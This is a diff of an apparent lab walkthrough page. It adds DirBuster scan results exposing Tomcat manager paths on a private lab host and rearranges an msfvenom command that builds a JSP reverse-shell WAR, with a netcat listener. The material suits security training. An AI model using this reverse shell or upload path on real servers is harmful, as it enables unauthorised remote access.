@@ -60,13 +60,39 @@ nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oX portScan.xml
 
 {% tab title="Report" %}
 ```bash
+DirBuster 1.0-RC1 - Report
+http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+Report produced on Wed Jul 21 17:35:09 EDT 2021
+--------------------------------
+
+http://172.16.64.101:8080
+--------------------------------
+Directories found during testing:
+
+Dirs found with a 200 response:
+
+/
+
+Dirs found with a 302 response:
+
+/manager/
+
+Dirs found with a 401 response:
+
+/manager/html/
+/manager/text/
+/manager/status/
+
+
+--------------------------------
+--------------------------------
 
 ```
 {% endtab %}
 {% endtabs %}
 
 {% hint style="info" %}
-Trying to access unsuccessfully for a couple of times will get you redirected to [**http://172.16.64.101:8080/host-manager/html**](http://172.16.64.101:8080/host-manager/html), where the following information is shown:
+Trying to access unsuccessfully for a couple of times will get you redirected to [**http://172.16.64.101:8080/manager/html**](http://172.16.64.101:8080/manager/html), where the following information is shown:
 
 ```text
 <role rolename="admin-gui"/>
@@ -76,15 +102,19 @@ Trying to access unsuccessfully for a couple of times will get you redirected to
 [**http://172.16.64.101:8080/manager/html**](http://172.16.64.101:8080/manager/html) ****allows you to upload a war file.
 {% endhint %}
 
-#### Generate your reverse shell with `msfvenom`
-
-```bash
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=1234 -f war > shell.war
-```
-
+{% tabs %}
+{% tab title="ncat listener" %}
 ```bash
 nc -lvp 1234
 ```
+{% endtab %}
+
+{% tab title="Generate your reverse shell with msfvenom" %}
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=1234 -f war > shell.war
+```
+{% endtab %}
+{% endtabs %}
 
 {% hint style="success" %}
 **Flag encountered!**
@@ -103,7 +133,19 @@ You did it!
 | :--- | :--- | :--- | :--- |
 | 80/tcp | open | http | Apache httpd 2.4.18 |
 
-#### dirbuster
+{% tabs %}
+{% tab title="Dirbuster" %}
+* Target URL: [http://172.16.64.140](http://172.16.64.140/project)
+* File Extension: \*
+* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+{% endtab %}
+
+{% tab title="Report" %}
+```bash
+
+```
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/dirbuster-140-1.png)
 
